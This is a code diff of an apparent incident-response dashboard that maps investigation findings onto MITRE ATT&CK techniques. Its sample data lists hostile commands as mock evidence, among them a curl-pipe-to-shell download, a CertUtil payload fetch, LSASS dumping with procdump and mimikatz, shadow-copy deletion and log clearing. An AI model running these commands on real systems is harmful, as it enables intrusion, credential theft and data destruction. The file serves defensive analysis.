+            { id:"T1078", name:"Valid Accounts" }
+        ]
+    },
+    "Privilege Escalation": {
+        tactics_id: "TA0004",
+        techniques: [
+            { id:"T1548", name:"Abuse Elevation Control Mechanism" },
+            { id:"T1134", name:"Access Token Manipulation" },
+            { id:"T1547", name:"Boot or Logon Autostart Execution" },
+            { id:"T1037", name:"Boot or Logon Initialization Scripts" },
+            { id:"T1543", name:"Create or Modify System Process" },
+            { id:"T1546", name:"Event Triggered Execution" },
+            { id:"T1574", name:"Hijack Execution Flow" },
+            { id:"T1055", name:"Process Injection" },
+            { id:"T1053", name:"Scheduled Task/Job" },
+            { id:"T1068", name:"Exploitation for Privilege Escalation" },
+            { id:"T1078", name:"Valid Accounts" }
+        ]
+    },
+    "Defense Evasion": {
+        tactics_id: "TA0005",
+        techniques: [
+            { id:"T1548", name:"Abuse Elevation Control Mechanism" },
+            { id:"T1134", name:"Access Token Manipulation" },
+            { id:"T1197", name:"BITS Jobs" },
+            { id:"T1620", name:"Debugger Evasion" },
+            { id:"T1140", name:"Deobfuscate/Decode Files or Information" },
+            { id:"T1612", name:"Build Image on Host" },
+            { id:"T1027", name:"Obfuscated Files or Information" },
+            { id:"T1036", name:"Masquerading" },
+            { id:"T1055", name:"Process Injection" },
+            { id:"T1574", name:"Hijack Execution Flow" },
+            { id:"T1562", name:"Impair Defenses" },
+            { id:"T1070", name:"Indicator Removal" },
+            { id:"T1078", name:"Valid Accounts" },
+            { id:"T1550", name:"Use Alternate Authentication Material" },
+            { id:"T1202", name:"Indirect Command Execution" },
+            { id:"T1038", name:"DLL Search Order Hijacking" }
+        ]
+    },
+    "Credential Access": {
+        tactics_id: "TA0006",
+        techniques: [
+            { id:"T1110", name:"Brute Force" },
+            { id:"T1552", name:"Credentials in Files" },
+            { id:"T1212", name:"Exploitation for Credential Access" },
+            { id:"T1556", name:"Modify Authentication Process" },
+            { id:"T1056", name:"Input Capture" },
+            { id:"T1558", name:"Steal or Forge Kerberos Tickets" },
+            { id:"T1003", name:"OS Credential Dumping" },
+            { id:"T1040", name:"Network Sniffing" },
+            { id:"T1111", name:"Multi-Factor Authentication Interception" },
+            { id:"T1557", name:"Adversary-in-the-Middle" },
+            { id:"T1606", name:"Forge Web Credentials" }
+        ]
+    },
+    "Discovery": {
+        tactics_id: "TA0007",
+        techniques: [
+            { id:"T1087", name:"Account Discovery" },
+            { id:"T1010", name:"Application Window Discovery" },
+            { id:"T1217", name:"Browser Information Discovery" },
+            { id:"T1083", name:"File and Directory Discovery" },
+            { id:"T1046", name:"Network Service Discovery" },
+            { id:"T1135", name:"Network Share Discovery" },
+            { id:"T1049", name:"System Network Connections Discovery" },
+            { id:"T1057", name:"Process Discovery" },
+            { id:"T1012", name:"Query Registry" },
+            { id:"T1518", name:"Software Discovery" },
+            { id:"T1082", name:"System Information Discovery" },
+            { id:"T1016", name:"System Network Configuration Discovery" },
+            { id:"T1033", name:"System Owner/User Discovery" },
+            { id:"T1124", name:"System Time Discovery" },
+            { id:"T1497", name:"Virtualization/Sandbox Evasion" }
+        ]
+    },
+    "Lateral Movement": {
+        tactics_id: "TA0008",
+        techniques: [
+            { id:"T1210", name:"Exploitation of Remote Services" },
+            { id:"T1534", name:"Internal Spearphishing" },
+            { id:"T1570", name:"Lateral Tool Transfer" },
+            { id:"T1563", name:"Remote Service Session Hijacking" },
+            { id:"T1021", name:"Remote Services" },
+            { id:"T1091", name:"Replication Through Removable Media" },
+            { id:"T1072", name:"Software Deployment Tools" },
+            { id:"T1080", name:"Taint Shared Content" },
+            { id:"T1550", name:"Use Alternate Authentication Material" }
+        ]
+    },
+    "Collection": {
+        tactics_id: "TA0009",
+        techniques: [
+            { id:"T1005", name:"Data from Local System" },
+            { id:"T1039", name:"Data from Network Shared Drive" },
+            { id:"T1025", name:"Data from Removable Media" },
+            { id:"T1114", name:"Email Collection" },
+            { id:"T1056", name:"Input Capture" },
+            { id:"T1123", name:"Audio Capture" },
+            { id:"T1113", name:"Screen Capture" },
+            { id:"T1185", name:"Browser Session Hijacking" },
+            { id:"T1119", name:"Automated Collection" }
+        ]
+    },
+    "Command and Control": {
+        tactics_id: "TA0011",
+        techniques: [
+            { id:"T1071", name:"Application Layer Protocol" },
+            { id:"T1095", name:"Non-Application Layer Protocol" },
+            { id:"T1132", name:"Data Encoding" },
+            { id:"T1001", name:"Data Obfuscation" },
+            { id:"T1105", name:"Ingress Tool Transfer" },
+            { id:"T1104", name:"Multi-Stage Channels" },
+            { id:"T1088", name:"Domain Generation Algorithms" },
+            { id:"T1189", name:"Drive-by Compromise" },
+            { id:"T1573", name:"Encrypted Channel" },
+            { id:"T1568", name:"Dynamic Resolution" },
+            { id:"T1571", name:"Non-Standard Port" },
+            { id:"T1572", name:"Protocol Tunneling" },
+            { id:"T1102", name:"Web Service" }
+        ]
+    },
+    "Exfiltration": {
+        tactics_id: "TA0010",
+        techniques: [
+            { id:"T1567", name:"Exfiltration Over Web Service" },
+            { id:"T1048", name:"Exfiltration Over Alternative Protocol" },
+            { id:"T1041", name:"Exfiltration Over C2 Channel" },
+            { id:"T1011", name:"Exfiltration Over Other Network Medium" },
+            { id:"T1052", name:"Exfiltration Over Physical Medium" },
+            { id:"T1560", name:"Archive Collected Data" },
+            { id:"T1030", name:"Data Transfer Size Limits" }
+        ]
+    },
+    "Impact": {
+        tactics_id: "TA0040",
+        techniques: [
+            { id:"T1531", name:"Account Access Removal" },
+            { id:"T1486", name:"Data Encrypted for Impact" },
+            { id:"T1485", name:"Data Destruction" },
+            { id:"T1490", name:"Inhibit System Recovery" },
+            { id:"T1489", name:"Service Stop" },
+            { id:"T1498", name:"Network Denial of Service" },
+            { id:"T1496", name:"Resource Hijacking" },
+            { id:"T1488", name:"Disk Wipe" },
+            { id:"T1491", name:"Defacement" },
+            { id:"T1529", name:"System Shutdown/Reboot" }
+        ]
+    }
+};
 
-  { tactic:"Resource Development", id:"T1583", name:"Acquire Infrastructure", desc:"Adversaries may buy, lease, or rent infrastructure for use in operations", confidence:0 },
-  { tactic:"Resource Development", id:"T1587", name:"Develop Capabilities", desc:"Adversaries may develop malware, tools, or exploits for operational use", confidence:1 },
-  { tactic:"Resource Development", id:"T1588", name:"Obtain Capabilities", desc:"Adversaries may acquire capabilities from third parties or online sources", confidence:0 },
-  { tactic:"Resource Development", id:"T1585", name:"Establish Accounts", desc:"Adversaries may create accounts with services for use in targeting", confidence:2 },
+// ============================================
+// Application State
+// ============================================
+let caseData = null;
+let detectedTechniques = {}; // { "TXXXX": [ { type, text } ] }
+let currentFilter = "all";
 
-  { tactic:"Initial Access", id:"T1190", name:"Exploit Public-Facing App", desc:"Adversaries may exploit vulnerabilities in internet-facing applications", confidence:4 },
-  { tactic:"Initial Access", id:"T1133", name:"External Remote Services", desc:"Adversaries may leverage external remote services for initial access", confidence:3 },
-  { tactic:"Initial Access", id:"T1566", name:"Phishing", desc:"Adversaries may send phishing emails to gain initial access", confidence:2 },
-  { tactic:"Initial Access", id:"T1078", name:"Valid Accounts", desc:"Adversaries may use compromised credentials to gain access", confidence:4 },
-  { tactic:"Initial Access", id:"T1189", name:"Drive-by Compromise", desc:"Adversaries may compromise victims through web browser exploitation", confidence:1 },
-
-  { tactic:"Execution", id:"T1059", name:"Command and Scripting Interpreter", desc:"Adversaries may abuse command and scripting interpreters to execute code", confidence:4 },
-  { tactic:"Execution", id:"T1053", name:"Scheduled Task/Job", desc:"Adversaries may schedule tasks or jobs for malicious execution", confidence:3 },
-  { tactic:"Execution", id:"T1204", name:"User Execution", desc:"Adversaries may rely on user interaction to execute malicious content", confidence:2 },
-  { tactic:"Execution", id:"T1047", name:"WMI", desc:"Adversaries may use WMI for command execution and discovery", confidence:3 },
-  { tactic:"Execution", id:"T1569", name:"System Services", desc:"Adversaries may abuse system services for malicious execution", confidence:1 },
-
-  { tactic:"Persistence", id:"T1547", name:"Boot or Logon Autostart", desc:"Adversaries may configure autostart mechanisms for persistence", confidence:4 },
-  { tactic:"Persistence", id:"T1136", name:"Create Account", desc:"Adversaries may create accounts to maintain persistence", confidence:2 },
-  { tactic:"Persistence", id:"T1543", name:"Create or Modify System Process", desc:"Adversaries may create or modify system processes for persistence", confidence:3 },
-  { tactic:"Persistence", id:"T1197", name:"BITS Jobs", desc:"Adversaries may abuse BITS for persistent and stealthy downloads", confidence:2 },
-  { tactic:"Persistence", id:"T1546", name:"Event Triggered Execution", desc:"Adversaries may set up event triggers for persistent execution", confidence:3 },
-  { tactic:"Persistence", id:"T1574", name:"Hijack Execution Flow", desc:"Adversaries may hijack execution flows for persistence or privilege escalation", confidence:4 },
-
-  { tactic:"Privilege Escalation", id:"T1548", name:"Abuse Elevation Control", desc:"Adversaries may circumvent mechanisms designed to control elevation of privileges", confidence:3 },
-  { tactic:"Privilege Escalation", id:"T1068", name:"Exploitation for Priv Esc", desc:"Adversaries may exploit software vulnerabilities for privilege escalation", confidence:4 },
-  { tactic:"Privilege Escalation", id:"T1134", name:"Access Token Manipulation", desc:"Adversaries may manipulate access tokens for privilege escalation", confidence:3 },
-  { tactic:"Privilege Escalation", id:"T1547", name:"Boot or Logon Autostart", desc:"Adversaries may configure autostart mechanisms to escalate privileges", confidence:4 },
-
-  { tactic:"Defense Evasion", id:"T1027", name:"Obfuscated Files or Information", desc:"Adversaries may obfuscate content to avoid detection", confidence:4 },
-  { tactic:"Defense Evasion", id:"T1055", name:"Process Injection", desc:"Adversaries may inject code into processes to evade defenses", confidence:4 },
-  { tactic:"Defense Evasion", id:"T1070", name:"Indicator Removal", desc:"Adversaries may remove indicators of compromise to evade detection", confidence:3 },
-  { tactic:"Defense Evasion", id:"T1562", name:"Impair Defenses", desc:"Adversaries may disable or modify security tools and monitoring", confidence:4 },
-  { tactic:"Defense Evasion", id:"T1140", name:"Deobfuscate/Decode Files", desc:"Adversaries may deobfuscate or decode files at runtime", confidence:2 },
-  { tactic:"Defense Evasion", id:"T1036", name:"Masquerading", desc:"Adversaries may manipulate artifacts to disguise malicious content", confidence:3 },
-
-  { tactic:"Credential Access", id:"T1110", name:"Brute Force", desc:"Adversaries may use brute force to gain unauthorized access to accounts", confidence:2 },
-  { tactic:"Credential Access", id:"T1552", name:"Unsecured Credentials", desc:"Adversaries may search for unsecured credentials in files or systems", confidence:3 },
-  { tactic:"Credential Access", id:"T1550", name:"Use Alternate Auth Material", desc:"Adversaries may use alternate authentication material like pass-the-hash", confidence:4 },
-  { tactic:"Credential Access", id:"T1003", name:"OS Credential Dumping", desc:"Adversaries may dump credentials from operating system stores", confidence:4 },
-  { tactic:"Credential Access", id:"T1528", name:"Steal Application Access Token", desc:"Adversaries may steal tokens from applications for access", confidence:3 },
-
-  { tactic:"Discovery", id:"T1082", name:"System Info Discovery", desc:"Adversaries may enumerate system information for situational awareness", confidence:2 },
-  { tactic:"Discovery", id:"T1087", name:"Account Discovery", desc:"Adversaries may enumerate accounts on systems and directories", confidence:1 },
-  { tactic:"Discovery", id:"T1046", name:"Network Service Discovery", desc:"Adversaries may enumerate services on networked systems", confidence:3 },
-  { tactic:"Discovery", id:"T1010", name:"Application Window Discovery", desc:"Adversaries may discover application windows for targeting", confidence:0 },
-
-  { tactic:"Lateral Movement", id:"T1021", name:"Remote Services", desc:"Adversaries may use remote services for lateral movement", confidence:3 },
-  { tactic:"Lateral Movement", id:"T1210", name:"Exploitation of Remote Services", desc:"Adversaries may exploit vulnerabilities in remote services for movement", confidence:4 },
-  { tactic:"Lateral Movement", id:"T1539", name:"Steal Web Session Cookie", desc:"Adversaries may steal web session cookies for lateral access", confidence:2 },
-  { tactic:"Lateral Movement", id:"T1570", name:"Lateral Tool Transfer", desc:"Adversaries may transfer tools between compromised systems", confidence:3 },
-  { tactic:"Lateral Movement", id:"T1080", name:"Taint Shared Content", desc:"Adversaries may taint shared content for lateral movement", confidence:1 },
-
-  { tactic:"Collection", id:"T1005", name:"Data from Local System", desc:"Adversaries may collect data from compromised local systems", confidence:3 },
-  { tactic:"Collection", id:"T1039", name:"Data from Network Shared Drive", desc:"Adversaries may collect data from network shared drives", confidence:2 },
-  { tactic:"Collection", id:"T1114", name:"Email Collection", desc:"Adversaries may collect email from compromised systems", confidence:1 },
-  { tactic:"Collection", id:"T1115", name:"Clipboard Data", desc:"Adversaries may collect data from clipboard contents", confidence:2 },
-
-  { tactic:"Command and Control", id:"T1071", name:"Application Layer Protocol", desc:"Adversaries may use application layer protocols for C2 communications", confidence:4 },
-  { tactic:"Command and Control", id:"T1095", name:"Non-App Layer Protocol", desc:"Adversaries may use non-application layer protocols for C2", confidence:3 },
-  { tactic:"Command and Control", id:"T1573", name:"Encrypted Channel", desc:"Adversaries may use encrypted channels for C2 communications", confidence:4 },
-  { tactic:"Command and Control", id:"T1105", name:"Ingress Tool Transfer", desc:"Adversaries may transfer tools to compromised systems from external sources", confidence:3 },
-  { tactic:"Command and Control", id:"T1098", name:"Valid Accounts", desc:"Adversaries may use compromised accounts for C2 infrastructure", confidence:2 },
-
-  { tactic:"Exfiltration", id:"T1041", name:"Exfiltration Over C2 Channel", desc:"Adversaries may exfiltrate data over the C2 channel", confidence:3 },
-  { tactic:"Exfiltration", id:"T1048", name:"Exfiltration Over Alt Protocol", desc:"Adversaries may use alternative protocols to exfiltrate data", confidence:4 },
-  { tactic:"Exfiltration", id:"T1567", name:"Exfiltration Over Web Service", desc:"Adversaries may use web services for data exfiltration", confidence:2 },
-  { tactic:"Exfiltration", id:"T1059", name:"Automated Exfiltration", desc:"Adversaries may configure automated mechanisms for data exfiltration", confidence:1 },
-
-  { tactic:"Impact", id:"T1489", name:"Service Stop", desc:"Adversaries may stop or disable services on compromised systems", confidence:3 },
-  { tactic:"Impact", id:"T1490", name:"Inhibit System Recovery", desc:"Adversaries may inhibit system recovery mechanisms", confidence:4 },
-  { tactic:"Impact", id:"T1486", name:"Data Encrypted for Impact", desc:"Adversaries may encrypt data on target systems to cause impact", confidence:4 },
-  { tactic:"Impact", id:"T1498", name:"Disk Wipe", desc:"Adversaries may wipe disk structures to cause maximum damage", confidence:2 }
-];
-
-const TACTIC_ORDER = [
-  "Reconnaissance","Resource Development","Initial Access","Execution",
-  "Persistence","Privilege Escalation","Defense Evasion","Credential Access",
-  "Discovery","Lateral Movement","Collection","Command and Control",
-  "Exfiltration","Impact"
-];
-
-const CONF_LABELS = ["Not Detected","Low","Medium","High","Critical"];
-const CONF_COLORS = ["#475569","#10B981","#F59E0B","#F97316","#EF4444"];
-
-// ─── State ──────────────────────────────────────────────────────
-let currentData = JSON.parse(JSON.stringify(SAMPLE_DATA));
-let searchTerm = "";
-
-// ─── Helpers ───────────────────────────────────────────────────
-function showToast(msg, type="success") {
-  const t = document.getElementById("toast");
-  t.textContent = msg;
-  t.className = "toast " + type;
-  requestAnimationFrame(() => t.classList.add("show"));
-  setTimeout(() => t.classList.remove("show"), 3000);
-}
-
+// ============================================
+// Extract case ID from URL
+// ============================================
 function getCaseId() {
-  const p = new URLSearchParams(window.location.search);
-  return p.get("caseId") || p.get("case_id") || p.get("case") || null;
+    const path = window.location.pathname;
+    const match = path.match(/\/cases\/([^/]+)/);
+    if (match) return match[1];
+    const params = new URLSearchParams(window.location.search);
+    return params.get('caseId') || params.get('case') || 'default';
 }
 
-// ─── Render ─────────────────────────────────────────────────────
-function renderHeatmap(data) {
-  const container = document.getElementById("heatmapInner");
-  container.innerHTML = "";
+// ============================================
+// Fetch case report JSON
+// ============================================
+async function fetchCaseData(caseId) {
+    const endpoints = [
+        `/reports/${caseId}/json`,
+        `/api/reports/${caseId}`,
+        `/api/cases/${caseId}/report`,
+        `/cases/${caseId}/report/json`
+    ];
 
-  // Group data by tactic, respecting order
-  const grouped = {};
-  TACTIC_ORDER.forEach(t => grouped[t] = []);
-  data.forEach(d => {
-    if (grouped[d.tactic]) grouped[d.tactic].push(d);
-    else grouped[d.tactic] = [d];
-  });
+    for (const url of endpoints) {
+        try {
+            const resp = await fetch(url);
+            if (resp.ok) {
+                const data = await resp.json();
+                return data;
+            }
+        } catch(e) { /* try next */ }
+    }
+    return null;
+}
 
-  // Compute stats
-  const detected = data.filter(d => d.confidence > 0);
-  const low = data.filter(d => d.confidence === 1).length;
-  const med = data.filter(d => d.confidence === 2).length;
-  const high = data.filter(d => d.confidence === 3).length;
-  const crit = data.filter(d => d.confidence === 4).length;
-  renderStats(detected.length, data.length, low, med, high, crit);
+// ============================================
+// Parse MITRE techniques from case JSON
+// ============================================
+function extractTechniquesFromReport(data) {
+    const findings = {};
 
-  // Build columns
-  TACTIC_ORDER.forEach(tactic => {
-    const techniques = grouped[tactic];
-    const col = document.createElement("div");
-    col.className = "tactic-col";
+    // Helper: add a finding to a technique
+    function addFinding(techId, type, text) {
+        techId = techId.trim().toUpperCase();
+        // Normalize: T1059.001 -> T1059.001, t1059 -> T1059
+        if (!techId.match(/^T\d{4}(\.\d{3})?$/)) return;
+        if (!findings[techId]) findings[techId] = [];
+        // Deduplicate
+        const key = type + '::' + text;
+        if (!findings[techId].some(f => (f.type+'::'+f.text) === key)) {
+            findings[techId].push({ type, text });
+        }
+    }
 
-    // Header
-    const header = document.createElement("div");
-    header.className = "tactic-header";
-    header.textContent = tactic.toUpperCase();
-    header.title = tactic;
-    col.appendChild(header);
+    if (!data) return findings;
 
-    // Technique list
-    const list = document.createElement("div");
-    list.className = "technique-list";
+    // Strategy 1: Direct mitre_techniques_observed field
+    if (data.mitre_techniques_observed) {
+        const observed = data.mitre_techniques_observed;
+        if (Array.isArray(observed)) {
+            observed.forEach(entry => {
+                if (typeof entry === 'string') {
+                    addFinding(entry, 'finding', 'Identified in case findings');
+                } else if (entry.technique_id || entry.id) {
+                    const tid = entry.technique_id || entry.id;
+                    const evList = entry.evidence || entry.findings || entry.linked_findings || [];
+                    if (evList.length > 0) {
+                        evList.forEach(e => addFinding(tid, typeof e === 'object' ? (e.type||'finding') : 'finding', typeof e === 'object' ? (e.text||e.path||e.description||JSON.stringify(e)) : String(e)));
+                    } else {
+                        addFinding(tid, 'finding', entry.description || entry.name || 'Observed in investigation');
+                    }
+                }
+            });
+        }
+    }
 
-    techniques.forEach(tech => {
-      const cell = document.createElement("div");
-      cell.className = "tech-cell conf-" + tech.confidence;
-      cell.dataset.id = tech.id;
-      cell.dataset.name = tech.name.toLowerCase();
-      cell.dataset.tactic = tactic.toLowerCase();
+    // Strategy 2: Walk all findings for technique_id / mitre_technique_id references
+    function walkFindings(obj, path) {
+        if (!obj || typeof obj !== 'object') return;
+        if (Array.isArray(obj)) {
+            obj.forEach((item, i) => walkFindings(item, path + '[' + i + ']'));
+            return;
+        }
+        // Check if this object has a technique ID
+        const tid = obj.technique_id || obj.techniqueId || obj.mitre_technique_id || obj.mitre_technique_id;
+        if (tid) {
+            // Try to find associated evidence
+            const evidence = obj.evidence || obj.evidence_path || obj.file_path || obj.artifact_path || [];
+            const desc = obj.description || obj.finding || obj.name || obj.detail || '';
+            const ioc = obj.ioc || obj.indicator || obj.observable || '';
+            const filePath = obj.file || obj.file_path || obj.path || obj.artifact || obj.source || '';
 
-      const idSpan = document.createElement("div");
-      idSpan.className = "tech-id";
-      idSpan.textContent = tech.id;
+            if (Array.isArray(evidence) && evidence.length > 0) {
+                evidence.forEach(e => {
+                    if (typeof e === 'string') {
+                        addFinding(tid, 'finding', e);
+                    } else {
+                        const eType = e.type || (e.path ? 'file' : e.ioc ? 'ioc' : 'finding');
+                        const eText = e.text || e.path || e.description || e.ioc || e.value || JSON.stringify(e);
+                        addFinding(tid, eType, eText);
+                    }
+                });
+            }
+            if (filePath) addFinding(tid, 'file', filePath);
+            if (ioc) addFinding(tid, 'ioc', typeof ioc === 'string' ? ioc : JSON.stringify(ioc));
+            if (desc && !filePath && !ioc && !(Array.isArray(evidence) && evidence.length > 0)) {
+                addFinding(tid, 'finding', desc);
+            }
+            // If no evidence at all, still mark as detected
+            if (!findings[tid] || findings[tid].length === 0) {
+                addFinding(tid, 'finding', desc || 'Referenced in case findings');
+            }
+        }
 
-      const nameSpan = document.createElement("div");
-      nameSpan.className = "tech-name";
-      nameSpan.textContent = tech.name;
+        // Also check for tags or labels
+        if (obj.tags && Array.isArray(obj.tags)) {
+            obj.tags.forEach(tag => {
+                const match = String(tag).match(/^(T\d{4}(\.\d{3})?)$/i);
+                if (match) {
+                    addFinding(match[1].toUpperCase(), 'finding', obj.description || obj.name || obj.text || `Tagged: ${match[1]}`);
+                }
+            });
+        }
 
-      cell.appendChild(idSpan);
-      cell.appendChild(nameSpan);
+        // Recurse
+        for (const key of Object.keys(obj)) {
+            if (key === 'parent' || key === 'prev' || key === 'next') continue;
+            walkFindings(obj[key], path + '.' + key);
+        }
+    }
+    walkFindings(data, '');
 
-      // Highlight if search matches
-      if (searchTerm && (tech.id.toLowerCase().includes(searchTerm) || tech.name.toLowerCase().includes(searchTerm))) {
-        cell.classList.add("highlight");
-      }
+    // Strategy 3: Look for investigation_chains or chains
+    if (data.investigation_chains || data.chains) {
+        const chains = data.investigation_chains || data.chains;
+        if (Array.isArray(chains)) {
+            chains.forEach(chain => {
+                const steps = chain.steps || chain.findings || chain.events || [];
+                if (Array.isArray(steps)) {
+                    steps.forEach(step => walkFindings(step, 'chain'));
+                }
+            });
+        }
+    }
 
-      // Tooltip events
-      cell.addEventListener("mouseenter", e => showTooltip(e, tech));
-      cell.addEventListener("mousemove", e => moveTooltip(e));
-      cell.addEventListener("mouseleave", hideTooltip);
+    // Strategy 4: Check mitre_attack or attack_matrix fields
+    if (data.mitre_attack || data.attack_matrix) {
+        const matrix = data.mitre_attack || data.attack_matrix;
+        if (Array.isArray(matrix)) {
+            matrix.forEach(entry => {
+                if (entry.technique_id || entry.id) {
+                    const tid = entry.technique_id || entry.id;
+                    const evs = entry.evidence || entry.findings || entry.linked_findings || [];
+                    if (Array.isArray(evs) && evs.length > 0) {
+                        evs.forEach(e => addFinding(tid, typeof e === 'object' ? (e.type||'finding') : 'finding', typeof e === 'object' ? (e.text||e.path||e.description||JSON.stringify(e)) : String(e)));
+                    } else {
+                        addFinding(tid, 'finding', entry.description || entry.name || 'Mapped in ATT&CK matrix');
+                    }
+                }
+            });
+        }
+    }
 
-      list.appendChild(cell);
+    return findings;
+}
+
+// ============================================
+// Build sample data if no API available
+// ============================================
+function buildSampleData() {
+    return {
+        "T1190": [
+            { type:"file", text:"/var/log/apache2/error.log - SQL injection attempt: /login?id=1' OR '1'='1" },
+            { type:"ioc", text:"HTTP request to /wp-admin from 185.220.101.34" },
+            { type:"finding", text:"Apache Struts CVE-2023-44487 exploitation detected via WAF logs" }
+        ],
+        "T1059": [
+            { type:"file", text:"/home/admin/.bash_history - curl http://10.0.0.5/payload.sh | sh" },
+            { type:"file", text:"C:\\Windows\\Temp\\run.bat - net user hacker P@ss123 /add" },
+            { type:"finding", text:"PowerShell execution policy bypass: powershell -ep bypass -f update.ps1" }
+        ],
+        "T1078": [
+            { type:"finding", text:"Login from 203.0.113.50 using svc_backup account outside business hours" },
+            { type:"ioc", text:"svc_backup authenticated from 203.0.113.50 at 02:14 UTC" }
+        ],
+        "T1566": [
+            { type:"file", text:"/mail/inbox/msg_0042.eml - attachment: Q3_Report.xlsx.lnk" },
+            { type:"ioc", text:"Phishing sender: account-verify@micros0ft-portal.com" },
+            { type:"finding", text:"Spear-phishing email targeting finance team with macro-enabled document" }
+        ],
+        "T1055": [
+            { type:"file", text:"/proc/4482/maps - injected dll: C:\\Windows\\Temp\\keylog.dll" },
+            { type:"finding", text:"Process hollowing detected: svchost.exe spawned from unusual parent explorer.exe" }
+        ],
+        "T1053": [
+            { type:"file", text:"/etc/cron.d/persist - */5 * * * * root /tmp/beacon" },
+            { type:"finding", text:"Scheduled task 'WindowsUpdate' created at 03:00 daily executing C:\\Users\\Public\\svchost.exe" }
+        ],
+        "T1562": [
+            { type:"file", text:"/var/log/syslog - systemctl stop fail2han" },
+            { type:"finding", text:"Windows Defender real-time protection disabled via Set-MpPreference -DisableRealtime 1" },
+            { type:"finding", text:"Audit policy cleared: auditpol /clear" }
+        ],
+        "T1070": [
+            { type:"file", text:"/var/log/auth.log - last 48h of entries deleted" },
+            { type:"finding", text:"Event log cleared: wevtutil cl Security at 2024-01-15T03:12:07Z" }
+        ],
+        "T1003": [
+            { type:"file", text:"C:\\Windows\\Temp\\lsass.dmp - LSASS memory dump (847MB)" },
+            { type:"file", text:"/tmp/mimikatz_output.txt - sekurlsa::logonpasswords" },
+            { type:"finding", text:"Credential dumping via procdump: procdump -ma lsass.exe lsass.dmp" }
+        ],
+        "T1087": [
+            { type:"finding", text:"net user /domain executed on DC01 at 2024-01-14T22:05:31Z" },
+            { type:"finding", text:"ADSI query for all domain admin members via Get-ADGroupMember" }
+        ],
+        "T1082": [
+            { type:"finding", text:"Systeminfo executed on WORKSTATION-04" },
+            { type:"file", text:"/tmp/sys_info.txt - uname -a output" }
+        ],
+        "T1049": [
+            { type:"finding", text:"netstat -ano output showing C2 connections to 185.220.101.34:443" },
+            { type:"ioc", text:"Established TCP connection: 10.0.4.12:49832 -> 185.220.101.34:443" }
+        ],
+        "T1021": [
+            { type:"file", text:"/var/log/auth.log - SSH session from 10.0.2.5 as root at 22:41 UTC" },
+            { type:"finding", text:"RDP logon from 10.0.2.5 to DB-SERVER-01 using svc_admin credentials" }
+        ],
+        "T1570": [
+            { type:"file", text:"C$ share access: \\10.0.2.8\C$\Windows\Temp\mimikatz.exe copied" },
+            { type:"finding", text:"Admin share used to copy payload to WORKSTATION-07" }
+        ],
+        "T1071": [
+            { type:"ioc", text:"HTTPS C2 beacon to api.update-service[.]cloud every 45s" },
+            { type:"file", text:"/etc/hosts - 185.220.101.34 api.update-service.cloud" },
+            { type:"finding", text:"DNS queries for x7f3a2b.update-service.cloud with TXT record responses" }
+        ],
+        "T1573": [
+            { type:"ioc", text:"TLS 1.2 connection to 185.220.101.34 with self-signed cert CN=update-service" },
+            { type:"finding", text:"Encrypted channel using AES-256-CBC with key derived from DH exchange" }
+        ],
+        "T1105": [
+            { type:"file", text:"/tmp/cobalt_strike_beacon downloaded from 185.220.101.34/payload.bin" },
+            { type:"finding", text:"CertUtil -urlcache -split -f http://10.0.0.5/tools/ps.exe download detected" }
+        ],
+        "T1486": [
+            { type:"file", text:"C:\\Users\\Public\\README_DECRYPT.txt - ransom note demanding 2 BTC" },
+            { type:"finding", text:"Files encrypted with .locked extension across 47 file shares" },
+            { type:"ioc", text:"Encryption key exchange via Tor hidden service: xyz123.onion/pay" }
+        ],
+        "T1490": [
+            { type:"finding", text:"vssadmin delete shadows /all /quiet executed at 2024-01-15T03:08:00Z" },
+            { type:"file", text:"wbadmin delete catalog output in command history" }
+        ],
+        "T1489": [
+            { type:"finding", text:"Service 'MSSQLSERVER' stopped unexpectedly at 2024-01-15T02:55:00Z" },
+            { type:"file", text:"net stop WinDefend executed from C:\\Windows\\Temp\\stop.bat" }
+        ],
+        "T1036": [
+            { type:"file", text:"C:\\Windows\\Temp\\svchost.exe - masquerading as system binary (wrong directory)" },
+            { type:"finding", text:"Malicious binary named 'chrome_update.exe' placed in C:\\Users\\Public\\" }
+        ],
+        "T1027": [
+            { type:"finding", text:"Base64-encoded PowerShell payload decoded to reflective DLL injection" },
+            { type:"file", text:"payload.enc - XOR-encrypted with key 0x4A, decoded to PE executable" }
+        ],
+        "T1098": [
+            { type:"finding", text:"svc_backup account added to Domain Admins group via net group command" },
+            { type:"ioc", text:"Password changed for svc_backup at 2024-01-14T23:50:00Z" }
+        ],
+        "T1547": [
+            { type:"file", text:"Registry: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - 'update'='C:\\Users\\Public\\svchost.exe'" },
+            { type:"finding", text:"Startup folder persistence: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\update.lnk" }
+        ],
+        "T1110": [
+            { type:"finding", text:"47,832 failed RDP logon attempts for Administrator from 203.0.113.50" },
+            { type:"ioc", text:"Brute force source IP: 203.0.113.50 (5 failed attempts/second)" }
+        ],
+        "T1056": [
+            { type:"file", text:"C:\\Windows\\Temp\\keylog.dll - keystroke logger DLL loaded into explorer.exe" },
+            { type:"finding", text:"Clipboard monitoring via SetClipboardViewer API hook detected" }
+        ],
+        "T1048": [
+            { type:"ioc", text:"DNS exfiltration: 4.2MB of encoded data in TXT query responses to c2.example.com" },
+            { type:"finding", text:"Data exfiltrated via HTTPS POST to 185.220.101.34/api/upload (2.1GB total)" }
+        ],
+        "T1560": [
+            { type:"file", text:"C:\\Windows\\Temp\\archive.zip - password-protected ZIP of document share" },
+            { type:"finding", text:"RAR archive created: rar a -p -r C:\\Users\\Public\\data.rar C:\\Users\\Documents\\" }
+        ],
+        "T1083": [
+            { type:"finding", text:"dir /s /b C:\\Users\\*.docx executed on WORKSTATION-04" },
+            { type:"file", text:"find / -name '*.conf' 2>/dev/null - output in /tmp/scan_results.txt" }
+        ],
+        "T1018": [
+            { type:"finding", text:"nltest /dclist:corp.local executed for domain controller enumeration" },
+            { type:"ioc", text:"LDAP query: (objectClass=computer) returning 142 domain machines" }
+        ],
+        "T1135": [
+            { type:"finding", text:"net use \\FILE-SERVER-01\C$ executed from compromised admin workstation" },
+            { type:"file", text:"/etc/fstab - NFS mount entries for 10.0.1.0/24 file shares" }
+        ],
+        "T1114": [
+            { type:"file", text:"/mail/dump/admin@corp.local.pst - 2.4GB Outlook data file exfiltrated" },
+            { type:"finding", text:"Exchange Web Services (EWS) API used to pull all inbox items for executive account" }
+        ],
+        "T1123": [
+            { type:"finding", text:"Microphone access requested by unknown process: audiodg.exe child process" }
+        ],
+        "T1113": [
+            { type:"file", text:"C:\\Windows\\Temp\\screen_cap\\frame_0047.png - screenshot of financial dashboard" },
